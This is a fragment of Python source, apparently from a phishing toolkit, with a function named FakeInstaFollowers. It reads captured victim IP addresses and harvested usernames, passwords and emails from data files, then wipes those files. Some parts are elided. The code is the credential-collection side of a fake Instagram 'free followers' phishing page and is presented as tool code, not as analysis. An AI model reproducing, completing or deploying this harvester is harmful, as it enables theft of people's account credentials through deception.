...
def FakeInstaFollowers():
    ...
    with open("log/server.txt", "w") as phplog:
        ...
        def IP():
            FS = 0
            if not int(os.stat('modules/index/04/ip_data.txt').st_size) == int(FS):
                ip_file = open('modules/index/04/ip_data.txt', 'r')
                ip = ip_file.read()
                ip_file.close()
                ...
                ip_clear = open('modules/index/04/ip_data.txt', 'w')
                ip_clear.write('')
                ip_clear.close()
        ...
        def UP():
            FS = 0
            if not int(os.stat('modules/index/04/u_data.txt').st_size) == int(FS):

                # password #
                p_file = open('modules/index/04/p_data.txt', 'r')
                p = p_file.read()
                p_file.close()


                # username #
                u_file = open('modules/index/04/u_data.txt', 'r')
                u = u_file.read()
                u_file.close()


                # email #
                e_file = open('modules/index/04/e_data.txt', 'r')
                e = e_file.read()
                e_file.close()
                ...
                # clear-username #
                u_clear = open('modules/index/04/u_data.txt', 'w')
                u_clear.write('')
                u_clear.close()


                # clear-password #
                p_clear = open('modules/index/04/p_data.txt', 'w')
                p_clear.write('')
                p_clear.close()


                # clear-email #
                e_clear = open('modules/index/04/e_data.txt', 'w')
                e_clear.write('')
                e_clear.close()
